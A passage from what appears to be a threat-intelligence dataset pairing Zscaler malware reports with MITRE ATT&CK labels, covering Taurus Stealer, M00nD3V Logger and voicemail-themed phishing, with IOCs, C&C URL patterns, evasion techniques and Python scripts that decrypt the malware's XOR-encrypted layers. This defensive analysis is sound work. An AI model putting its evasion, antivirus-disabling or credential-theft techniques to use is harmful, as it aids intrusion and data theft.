GitHub repository, it uses the utility \u201cCertutil.exe\u201d to decode the payload.\nOut of three downloaded files, the first one is an AutoIT interpreter that is used to run the decoded AutoIT script.\nThen, Certutil.exe decrypts the second file, which is a Base64-encoded AutoIT file having a certificate as a header.\nThis AutoIT file will decrypt the third file, which is the Taurus Stealer.\nAfter deobfuscating the AutoIT\u00a0script, we noticed that it has multiple anti-sandbox techniques.\nIt checks for the Sleep patch in the sandbox using the GetTickCount function.\n![Anti-sandbox patch with GetTickCount Api](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/Anti-sandbox%20patch%20with%20GetTickCount%20Api.png)\n*Figure 9: The anti-sandbox patch with the GetTickCount API.*\nIt also checks for the existence of specific files, the computer name, and internet connectivity using the Ping function.\n![Multiple check for files, computer name & internet connectivity](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/Multiple%20check%20for%20files%2C%20computer%20name%20%26%20internet%20connectivity.png)\n*Figure 10: Taurus performs multiple checks for files, the computer name, and internet connectivity.*\nFinally, the AutoIT\u00a0script reads and decodes the **wsNcf.com** file, then loads the deobfuscated shellcode for injecting the decoded payload into dllhost.exe.\n![Building path for dllhost.exe](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/Autoit%20dllhost.PNG)\n*Figure 11:\u00a0Building a path for dllhost.exe.*\nFigure 12 shows\u00a0details of the deobsfucated shellcode, which will inject the payload.\n![Shellcode checking for executable to inject in dllhost.exe](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/Shellcode%20checking%20for%20executable%20to%20inject%20in%20dllhost.exe_.png)\n*Figure 12: The shellcode checking for the executable to inject in the dllhost.exe.*\nBefore starting the actual activity of the stealer, the malicious program is started by loading configuration into memory step by step.\n![Storing config into memory](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/Storing%20config%20into%20memory.png)\n*Figure 13:\u00a0Storing config into memory.*\nWe have successfully been able to see the further activity of the malicious program, which is the actual purpose of this malware**\u2014**stealing.\nFigure 14 shows the system information being fetched by the stealer.\n![System information fetched by stealer](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/System%20information.PNG)\n*Figure 14: The system information fetched by the stealer.*\n**Fileless approach**\nWhile\u00a0disassembling the code, we figured out that all the stolen data is being sent as a Zip file.\nInteresting part is that malware allocates a memory space for the Zip file and embeds the Zip file directly to the request data.\n![Zipped all the stolen data](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/zip%20file%20contains%20all%20stealed%20data.PNG)\n*Figure 15:\u00a0All the stolen data is put into a Zip file.*\n**Network Communication**\nAfter zipping all the stolen data, the malicious program tries to send that data to a Command and Control (C&C) server\u00a0after building the URL at run time, which is also pre-defined in the malicious program (Ofcourse XORed).\n![URL building](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/URI%20building2.PNG)\n*Figure 16: The URL building to send the stolen data to the C&C.*\nURL pattern: ***http://<Domain>/gate/cfg/?post=<digit>&data=<data>***\n**Cloud Sandbox detection**\nWe have analyzed the sample in the Zscaler Cloud Sandbox and successfully detected the malware.\n![Cloud Sandbox detection](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/Taurus%20Project/sandbox%20activity.PNG)\n*Figure 17: The Zscaler Cloud Sandbox successfully detected the malware.*\n**Conclusion**\nWe are actively monitoring for new threats in the\u00a0Zscaler cloud to protect\u00a0our customers.\nWe have added details of this malware to our threat library.\nVBA - <https://threatlibrary.zscaler.com/threats/3e4e094a-66e1-407a-8b42-7a683a54bfb1/>\nEXE - <https://threatlibrary.zscaler.com/threats/b26933a4-31f8-4618-a6cf-775f8a383116/>\n**MITRE ATT&CK TTP Mapping**\n| T1064 | Macros in document used for code execution.\n|\n| T1086 | PowerShell commands to execute payloads |\n| T1132 | Data Encoding |\n| T1020 | Automated Exfiltration |\n| T1003 | Credential Dumping |\n| T1503 | Credentials from Web Browser |\n| T1539 | Steal Web Session Cookie |\n| T1106 | Execution through API |\n| T1518 | Software Discovery |\n**Indicators of Compromise (IOCs)**\nECCD93CFA03A1F1F4B2AF649ADCCEB97 - **Doc file**\n3E08E18CCC55B17EEAEEDF3864ABCA78 - **Encrypted AutoIT script**\n221BBAC7C895453E973E47F9BCE5BFDC - **Encrypted Taurus Stealer**\n5E3EA2152589DF8AE64BA4CBB0B2BD3B - **Decrypted Taurus Stealer**\n**CnC**:\nbit-browser[.]gq\nAtest001[.]website\n**Panel**\n64.225.22[.]106/#/login", "mitre_ids": ["T1497", "T1539", "T1555", "T1082", "TA0010", "T1566", "T1566", "T1566", "T1105", "T1059", "T1566", "T1204", "T1204", "T1059", "T1059", "T1105", "T1027", "T1059", "T1059", "T1027", "T1059", "T1105", "T1059", "S0160", "T1539", "T1555", "T1539", "TA0006", "T1528", "T1518", "T1059", "S0160", "S0160", "T1497", "T1497", "T1497", "T1497", "T1140", "T1055", "T1140", "T1055", "T1055", "T1055", "TA0011", "TA0011", "TA0011", "T1059", "T1059", "T1027", "T1020", "TA0006", "T1555", "T1539", "T1518"], "anno_name_label": [["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Electrum"], ["TOOL", "WinSCP"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"], ["MALWARE", "Taurus"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "Deep Dive Into the M00nD3V Logger\nJuly 10, 2020\nThreatLabZ observed a **multifunctional** information-stealing Trojan named \"**M00nD3V Logger''** that is being dropped by a multistage loader.\nDue to its multiple stealing features,\u00a0**M00nD3V Logger** has\u00a0gradually gained popularity on hacking forums.\nRecently [Blueliv](https://www.blueliv.com/cyber-security-and-cyber-threat-intelligence-blog-blueliv/covid-19-cybercrime-m00nd3v-hawkeye-malware-threat-actor/) published a blog discussing the relationship of M00nD3V with the HawkEye stealer, along with information about the bad actor selling M00nD3V.\nAside from\u00a0keystroke logging, the M00nD3VLoggerhas the ability to steal confidential information such as browser passwords, FTP client\u00a0passwords, email client\u00a0passwords, DynDNS credentials, JDownloader credentials and capture Windows Keystrokes, as well as gain\u00a0access to the webcam and hook the clipboard.\nIn all, it\u00a0has the ability to steal passwords from 42 applications.\nM00nD3VLogger\u00a0is also equipped with other major functionality,\u00a0including a botkiller, an antivirus killer, communicating over SMTP/FTP/proxy, downloading additional plugins, and the BouncyCastle crypto package.\nThese mechanisms makes this logger unique and popular on hacking forums.\n![hk_acnt](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/seller_detail.JPG)\n*Figure 1: An image from the owner account.*\n**Delivery mechanism**\nDuring our research, we found M00nD3V was delivered via spam mail or through a compromised website that drops a payload on the victim's machine.\nOne such spam mail claims to be from \"Hyundai Heavy Industries Co., Ltd\"\u00a0regarding a bid\u00a0on a project for Qatargas.\nThe spam mail includes zip attachments that contain malicious executables.\n![spam](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/spam_mail.JPG)\n*Figure 2: Spam\u00a0Mail*\n![package](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/Package%20detail.JPG)\n![package](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/payment_method.JPG)\n*Figure 3: M00nD3V Logger subscription and payment method pages.*\nIn this blog, we will provide a detailed technical analysis of commercial M00nD3V\u00a0Logger\u00a0malware.\n**Technical analysis**\n* dab9565e03fae2c5c18c9071a713153a - Parent File (.Net)\n+ e9cf47f3b0750dd0ee1ca30ea9861cc9 - Loader (.Net)\n- bf8801bcd5a196744ccd0f863f84df71 - Final Payload (.Net)\nDelivering malware without triggering any suspicious activity while blending into an existing benign Windows process makes detection a bit harder.\nHere, the M00nD3V malware does one such trick to deliver its payload without getting easily noticed.\n![legitprocessinjec](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/regAsm.JPG)\n*Figure 4: The M00nD3V malware register\u00a0running with RegAsm.exe*\u00a0-\u00a0*Microsoft utility.*\nFigure 4 shows the post execution\u00a0of the malware.\nIn case of a whitelisted application, the endpoint antivirus will not trigger any malicious activity.\nHence, the malware can do its job on the fly without getting caught.\nThe\u00a0malware also runs by elevating its own privileges.\n**Unpacking routine**\nThe malware unpacks the encrypted payload using multibyte XOR decryption.\nWhile unpacking, the malware also uses null bytes in the XOR key.\nHence, a few bytes are not actually ciphered.\n**First layer decryption**\nThe\u00a0hard-coded pass variable \"*zvjzpeuCFasb*\" is used as a key.\nWhen converted to Unicode string, the same pass variable is: \"*z\\x00v\\x00j\\x00z\\x00p\\x00e\\x00u\\x00C\\x00F\\x00a\\x00s\\x00b\\x00*\".\nThe key length is\u00a024 bytes.\n![xor](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/xorFirstLayer.JPG)\n*Figure 5: First-level decryption using multibyte XOR.*\nEven though key length is 24, the malware uses only the first 16 bytes to decrypt the resource section of the encrypted data.\nThe above decryption\u00a0routine results\u00a0in a .NET\u00a0PE file.\nIn this dumped file,\u00a0there is also a similar XOR routine to decrypt the data but with a different key to run the final payload.\n**Second layer decryption**\nHere, the hard-coded pass variable \"*WcqqicsgTUaj\"*\u00a0is used as a key.\nWhen converted to Unicode string, the same pas variable is: \"*W\\x00c\\x00q\\x00q\\x00i\\x00c\\x00s\\x00g\\x00T\\x00U\\x00a\\x00j\\x00*\".\nWe have written a Python script to decrypt the encrypted payload, which can be found in Appendix I and Appendix II.\n**Payload analysis**\nStubConfig Class contains the configuration details - some of them are initialized with Base64 values while others are hardcoded.\n![stubcinfig](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/stub_config.JPG)\n*Figure 6: StubConfig details.*\nBefore starting to log user data, the M00nD3V Logger initializes its configuration.\nThe initialization phase includes several checks, such as an anti-debugger, a bot killer, an antivirus killer, and more.\n**Figure 7**\u00a0shows the initialization module.\n![initial](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/MoIntilize_phase.JPG)\n*Figure 7: Initialization phase*\nInitialization details:\n* DependencyLoader - Downloads the DLL from m00nd3v[.]com/M00nD3v/Decryption/BouncyCastle[.]Crypto.dll and loads it in memory.\n* ExecutionDelay - Sleeps for 5000 milliseconds before executing.\n* SingleInstance - Checks to see if a single instance is running or not\u00a0by checking for the hardcoded mutex value {99ed2fc7-0fdc-42ef-8b82-78d1c7c554e3} and sets a flag accordingly.\nIf an app is running with the same mutex, then the loader exits from environment.\n* DecryptCredential -\u00a0Uses the Rijndael256 algorithm to decrypt the Stub configuration values [cipher data is Base64 encoded value and key is hardcoded mutex value] and set them to their respective variables, as show in Figure 8.\n![pass_inti](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/password_intial.JPG)\n*Figure 8: The decrypt credential.*\n* Persistence - Copies\u00a0the parent file to AppData directory and begins the startup entry [SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run].\n* Antidebugger - Checks to see if any of the following processes are running:\u00a0SbieDll.dll, Wireshark, Winsock Packet Editor.\nIf any are found, the\u00a0malware terminates.\n![anit](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/antidebugr.JPG)\n*Figure 9: AntiDebugger checks during the initialization process.*\n* Antivirus killer -\u00a0Uses Image File Execution Options (IFEO) to interfere with the\u00a0executables shown in Figure 10.\nBy modifying the registry entry\u00a0 [Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\], the malware attaches rundll32.exe as debugger to each of the executables.\nThis way, it disables all the listed applications to run.\n![avlist](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/avlist.JPG)\n*Figure 10: Application list*\n* Process elevation -\u00a0As shown in Figure 11,\u00a0the malware contains a process elevation module, which is responsible for elevating\u00a0the privilege of the malware executable.\nThe malware sets the security identifier type as \"WorldSid\" with AceQualifier AccessDenied.\nIt is applicable to the \"Everyone\"\u00a0group, so if anyone attempts to kill the process, it won't be allowed to terminate.\n![processelv](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/process_elvation.JPG)\n*Figure 11: Process elevation.*\n* Bot killer -\u00a0Scans all running processes and Windows Startup registry entries [ \\\\Run\\\\ and \\\\RunOnce\\\\ ], then passes the file location path to module **IsFileMalicious()** to tag either the process or file as malicious and delete it accordingly.\n[Note: In case of a running process, it additionally checks for\u00a0each process window visibility property.\nIf it is set to false, then it is tagged as malicious.\n+ Figure 12 shows the checks used inside IsFileMalicious().\nHere, \u2018fileloc\u2019 is the full path of the file or process.\n![botkill](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/botkiller1.JPG)\n*Figure 12: Malicious checks of the file.*\nBefore starting to log the stored credentials and other personal data, it checks whether the malware was previously installed or not on the victim's machine by looking for a specific file name\u00a0with a combination of Processor Id and Volume Serial Number in the\u00a0temp directory.\nIf the file is not present, then it creates and writes Rijndael256 encrypted data, which is a combination of the current executable path and the hardcoded StubConfigEncryptionKey, and then\u00a0shows a fake message box to fool the victim.\n![stubkey](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/stubKey.JPG)\n*Figure 13: The Rijndael256 key.*\nThe malware has three kinds of communication methods to send logged data: SMTP, FTP, and proxy.\nBut this stub is configured to use only and send data over SMTP only.\nBefore starting any logging functionality, it checks whether the respective logging functionality variable is set in the Stub config entry or not.\nIf the value is not set in config, then it won't execute the \"keystroke functionality\".\nAs shown in Figure 14, the Stub is configured to execute the keystroke but not the webcam as the webcam value is not assigned.\n![web_key](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/webcam%2Bkeystroke.JPG)\n*Figure 14: Stub configuration.*\nThe Stub starts its core stealing functionality by sending full victim machine information, as shown in Figure 15**,** to the attacker over SMTP port 587\n![basic_info](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/basic_info_SMTP.JPG)\n*Figure 15: Basic machine information sent to the attacker.*\n**Network communication**\n***Via SMTP***\nThe malware communicates with the attacker over SMTP using port 587.\nThe malware\u00a0crafts\u00a0an\u00a0email with the captured details shown\u00a0in Figure 16\u00a0and sends\u00a0it to the attacker.\nThe attackers use \"**smtp.privateemail.com\"**\u00a0service to transfer the captured data.\n![via_smtp](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/Via_SMTP.JPG)\n*Figure 16: Information sent via SMTP.*\nThe **LogTypeName** mentioned below is used to tag the data\u00a0to inform the attacker what module it is running currently.\n![logtype](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/LogTypename.JPG)\n*Figure 17: Log type.*\n***Via FTP***\nWhile uploading data over FTP, it first converts plain text data to bytes and creates FTP requests by configuring all the FTP request fields (i.e., ftp\\_host, credentials, method).\nThe value for all these fields is set from the Stub configuration class.\nThe FTP method used to upload files is \"STOR\".\n![viaftp](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/ViaFtp.JPG)\n*Figure 18: Communicaiton via FTP.*\n**Via proxy**\u00a0\nThe malware sets the proxy URL from the config class and uploads the below-mentioned data using the POST method.\n![viaProxy](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/viaproxy.JPG)\n*Figure 19: Communication via proxy.*\nThe values encrypted with Rijndael256 where the key is the Proxy Key, which is configured in the Stub config class.\nEach stealing\u00a0module runs independently with individual threads, as shown in Figure 20.\n![steal_module](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/separate_thread.JPG)\n*Figure 20: The core modules.*\n**Password stealer:** M00nD3V Logger has the capability to steal passwords and cookies from all possible browsers and email clients, as well as FTP clients.\nInterestingly, the malware has three separate classes named \"ChromiumProvider\", \"MailProvider\", and \"MozillaProvider\"\u00a0as shown in Figure 21.\nEach provider has a functionality to retrieve and decrypt the password for the application that is assigned to that provider.\n![providerlist](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/Provider_list.png)\n*Figure 21: Provider list.*\nThe malware first tries\u00a0to decrypt the password with the data protection APT (DPAPI) library.\nBut if it isn't successful, then it attempts to decrypt the passwords using \"**BouncyCastle**\", which the malware downloaded from\u00a0\"m00nd3v.]com/]M00nD3v/Decryption/BouncyCastle.Crypto.dll\".\nIt includes \"**GcmBlockCipher**\" and \"**AeadParameters**\" classes,\u00a0whose instances help the malware decrypt the final password.\n![bouncy_castle](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/bouncy_castle.JPG)\u00a0\n*Figure 22: The BouncyCastle code.*\nThe collected passwords are sent to the attacker over SMTP.\n![pass_wteal](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/Password_stelaer_format.JPG)\n*Figure 23: The collected passwords sent over SMTP.*\n**Webcam**\nThe malware has the capability to secretly access the device's webcam and capture the image.\nThe malware copies the captured image onto the clipboard, extracts the image from clipboard, then\u00a0saves it in the temp directory.\nTo send stolen images over SMTP, it reads the image path and attaches the .bmp image as an email attachment with a\u00a0personalize the subject line, such\u00a0as \"**Dear M00nD3v user Please find the attachment of Webcam. Regards M00nD3v\"**\n![web_cam module](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/webcam.JPG)\n*Figure 24:\u00a0The webcam module.*\nSimilarly, the other modules\u00a0named keystrokes, clipboard, and screen sender, execute with individual threads and send stolen data to the attacker, then sleep for some period of time before repeating the same stealing process.\n![sandbox](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/M00D3v/zscaler%20report.JPG)\n*Figure 24:\u00a0The Zscaler Cloud Sandbox report for the\u00a0M00nD3V Logger.*\nThe following is the advanced threat protection signatures released for detecting the malware:\n[Win32.Backdoor.M00nD3v](https://threatlibrary.zscaler.com/?keyword=M00nD3v)\n**[MITRE ATT&CK](https://attack.mitre.org/)\u2122 tactic and technique\u00a0mapping**\n| T1503 | Credentials from Web Browsers |\n| T1112 | Modify Registry |\n| T1060 | Persistence |\n| T1057 | Process Discovery |\n| T1105 | Remote File Copy |\n| T1497 | Defense Evasion, Discovery |\n| T1083 | File and Directory Discovery |\n| T1089 | Disabling Security Tools |\n| T1055 | Process Injection |\n| T1548 | Abuse Elevation Control Mechanism |\n| T1115 | Clipboard Data |\n| T1113 | Screen Capture |\n| T1125 | Video Capture |\n| T1056 | Input Capture |\n| T1048 | Exfiltration Over Alternative Protocol |\n| T1183 | Image File Execution Options Injection |\n**IOCs:**\ndab9565e03fae2c5c18c9071a713153a - Parent File (.Net)\ne9cf47f3b0750dd0ee1ca30ea9861cc9 - Loader (.Net)\nbf8801bcd5a196744ccd0f863f84df71\u00a0 - Final Payload\n**C&C:**\nm00nd3v[.]com\n***Appendix I :***\nPython Script to decrypt first level decryption:\nfile=open('enc.bin','rb')\ncont=file.read()\nfile.close()\nxor\\_key=\"z\\x00v\\x00j\\x00z\\x00p\\x00e\\x00u\\x00C\\x00\"\nfl=''\nindex=0\nfor i in range(len(cont)):\n\u00a0\u00a0\u00a0\u00a0fl+=chr(ord(cont[i])^ord(xor\\_key[index%16]))\u00a0 #Malware doesn\u2019t use full key\n\u00a0\u00a0\u00a0\u00a0index+=1\nhexval=[]\nfor i in fl:\n\u00a0\u00a0\u00a0\u00a0temp=hex(ord(i))\n\u00a0\u00a0\u00a0\u00a0temp=temp[2:]\n\u00a0\u00a0\u00a0\u00a0if len(temp) !=2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0temp='0'+temp\n\u00a0\u00a0\u00a0\u00a0hexval.append(temp)\nhexva=(\"\".join(hexval))\nimport binascii\nbinstr=binascii.unhexlify(hexva)\nf=open('fixed','wb')\nf.write(binstr)\nf.close()\n***Appendix II :***\nPython script to decrypt second level decryption:\nfile=open('enc2.bin','rb')\ncont=file.read()\nfile.close()\nxor\\_key=\"W\\x00c\\x00q\\x00q\\x00i\\x00c\\x00s\n\\x00g\\x00T\\x00U\\x00a\\x00j\\x00\"\nxor\\_key=xor\\_key[0:16]\nfl=''\nindex=0\nfor i in range(len(cont)):\n\u00a0\u00a0\u00a0\u00a0fl+=chr(ord(cont[i])^ord(xor\\_key[index%16])) \u00a0 #Malware doesn\u2019t use full key\n\u00a0\u00a0\u00a0\u00a0index+=1\nhexval=[]\nfor i in fl:\n\u00a0\u00a0\u00a0\u00a0temp=hex(ord(i))\n\u00a0\u00a0\u00a0\u00a0temp=temp[2:]\n\u00a0\u00a0\u00a0\u00a0if len(temp) !=2:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0temp='0'+temp\n\u00a0\u00a0\u00a0\u00a0hexval.append(temp)\nhexva=(\"\".join(hexval))\nimport binascii\nbinstr=binascii.unhexlify(hexva)\nf=open('fixed2','wb')\nf.write(binstr)\nf.close()", "mitre_ids": ["TA0010", "T1056", "T1056", "TA0009", "T1555", "TA0006", "T1125", "T1115", "TA0006", "T1562", "T1071", "T1105", "T1189", "T1566", "T1566", "T1566", "T1055", "T1218", "TA0004", "T1140", "T1140", "T1140", "T1140", "T1140", "T1059", "T1140", "T1140", "T1056", "T1497", "T1562", "T1105", "TA0003", "T1037", "T1497", "T1562", "T1562", "T1562", "T1562", "TA0004", "TA0004", "T1005", "T1090", "T1041", "T1056", "T1056", "T1041", "T1041", "T1071", "T1071", "T1041", "T1041", "TA0011", "T1041", "T1071", "T1071", "T1071", "T1090", "T1090", "T1555", "T1041", "T1041", "T1125", "T1115", "T1041", "T1041", "T1056", "T1115", "T1113", "TA0010", "T1112", "TA0003", "T1057", "T1105", "T1497", "T1083", "T1055", "T1548", "T1115", "T1113", "T1125", "T1056", "T1048", "TA0011"], "anno_name_label": [["MALWARE", "M00nD3V"], ["MALWARE", "M00nD3V"], ["MALWARE", "M00nD3V"], ["MALWARE", "M00nD3V"], ["MALWARE", "HawkEye"], ["MALWARE", "M00nD3V"], ["MALWARE", "M00nD3V"], ["MALWARE", "M00nD3V"], ["MALWARE", "M00nD3V"], ["MALWARE", "M00nD3V"], ["MALWARE", "M00nD3V"], ["MALWARE", "M00nD3V"], ["MALWARE", "M00nD3V"], ["MALWARE", "M00nD3V"], ["MALWARE", "M00nD3V"], ["TECHNIQUE", "Credentials from Web Browsers"], ["TECHNIQUE", "Disable or Modify Tools"], ["TECHNIQUE", "Image File Execution Options Injection"]], "cti_entity_class": ["CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CE", "CI", "CI", "CE", "CE", "CI", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "New Voicemail-Themed Phishing Attacks Use Evasion Techniques and Steal Credentials\nJuly 17, 2020\nIn July 2020, researchers at ThreatLabZ observed an increase in the use of voicemail as a theme for social engineering attacks.\nThrough the intelligence gathered from the Zscaler cloud, we discovered several newly registered domains that use VoIP and voicemail as themes for their credential-stealing phishing campaigns.\nIn the most recent instance we saw, attackers were spoofing Cisco\u2019s Unity Connection voicemail platform.\nThis social engineering campaign is specifically designed to reach end users in large\u00a0enterprises.\nThe use of voicemail delivered in an email message, and the use of phishing pages that spoof enterprise applications, such as Office 365 and Outlook, signal the attackers\u2019 motives.\nIf successful in obtaining a user\u2019s credentials, attackers can access confidential data from the enterprise, potentially selling it or holding it for ransom.\nThey can also leverage company information to launch targeted attacks, which can give them an even greater foothold in the network and cause extensive damage and potential loss for the enterprise.\nIn this blog, we will describe how the current attacks are being carried out, the campaign\u2019s variants and evasion techniques, and the various social engineering tactics in use.\n**Distribution method**\n-----------------------\nThe attacks are being distributed through email with an HTML attachment that contains JavaScript code which redirects the user to the credential phishing site.\nContents of the email are crafted to mimic a system-generated voicemail notification, luring the user to open the attachment to access the recorded voice message as shown in Figure 1.\n![Picture 1](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/Picture%201.png)\n*Figure 1: Email message spoofing a voicemail notification*\n**HTML attachment analysis**\n----------------------------\nWe observed different variants of HTML attachments used in these credential-phishing campaigns.\n###\n### **Variant #1**\nThe email attachment is an HTML file that contains a short code snippet of JavaScript.\nIt uses *window.location.replace()* to redirect the user to the phishing site, as shown in Figure 2.\n![Picture 2](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/Picture%202.png)\n*Figure 2: Contents of HTML attachment*\nWe discovered more than 200 HTML email attachments of this variant, and we observed the following similarities between them.\n* All of these HTML attachments followed the naming convention:\u00a0![\u260e](https://mail.google.com/mail/e/260e)Play\\_VN\\_<string\\_of\\_11\\_digits>.html\n* An icon of a telephone was used in the filename for social engineering purposes\n* All these HTML attachments have a very low detection rate on VirusTotal as shown in Figure 3 below.\nFurthermore, the first sample of this variant was observed in the wild on April 21,\u00a02020; the fact that this theme is still being used suggests\u00a0that the threat actors have achieved decent success with it.\n![VT detection](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/VT_Detection.png)\nFigure 3: No\u00a0detection against AV engines, as seen on VirusTotal\n###\n### **Variant #2**\nIn the second variant, the HTML attachment contains JavaScript code that is used to decode the next-stage HTML.\nIt uses a simple URL encoding which is decoded using the *unescape()* function and then loaded in the browser as shown in Figure 4.\n![Picture 3](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/Picture%203.png)\n*Figure 4: HTML attachment containing encoded JavaScript*\nThe decoded content shown in Figure 5 uses the meta-refresh tag to redirect the user to the target credential phishing site.\n![Picture 4](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/Picture%204.png)\n*Figure 5: Decoded content which uses meta-refresh tag to redirect*\n**Phishing content loaded remotely using JavaScript**\n-----------------------------------------------------\nIn a few variants of the phishing landing pages, we observed that the final landing page used an external JavaScript to display the credential-phishing page in the browser.\nFigure 6\u00a0shows the source code of the phishing page; the highlighted part is the external JavaScript used to display the phishing content.\nAll of these external JavaScript files use\u00a0long filenames of 32 characters resembling an MD5 hash.\n![Figure 6](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/Figure%206.png)\n*Figure 6: Phishing landing page referencing an externally hosted JavaScript to load phishing content*\nUnlike common credential-phishing landing pages, we can see in this case that there is no information related to the brand being targeted.\nThis allows the threat actors to bypass many automated URL analysis engines and extend its survival.\nFigure 7\u00a0shows the relevant JavaScript code and where the user\u2019s credentials are being sent.\nThis code is present in randomly named and externally hosted JavaScript files.\n![Figure 7](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/Figure%207.png)\n*Figure 7: JavaScript file used to send user\u2019s credentials to attacker\u2019s server*\nFigure 8\u00a0shows a sample packet capture which highlights the method used to exfiltrate the stolen credentials to the attacker\u2019s site.\nIt sends the credentials in the Base64-encoded format.\nIt is important to note that in the first attempt, this phishing page will always give the \"password incorrect\" message,\u00a0which prompts users to enter their passwords more cautiously the next time.\n![Figure 8](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/Figure%208.png)\n*Figure 8: Packet capture showing credentials being exfiltrated*\n**Captcha-based evasion technique**\n-----------------------------------\nIn one of the campaigns related to voicemail, attackers used Google\u2019s reCAPTCHA on the landing page to evade automated URL analysis, as shown in Figures 9 and 10.\n![Picture 8](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/Picture%208.png)\n*Figure 9: Google\u2019s reCAPTCHA\u00a0used for evading automated URL analysis*\n*![Picture 9](/cdn-cgi/image/format=auto/sites/default/files/images/blogs/voicemail_phishing/Picture%209.png)*\n*Figure 10: Google reCAPTCHA\u00a0used as a security challenge on the 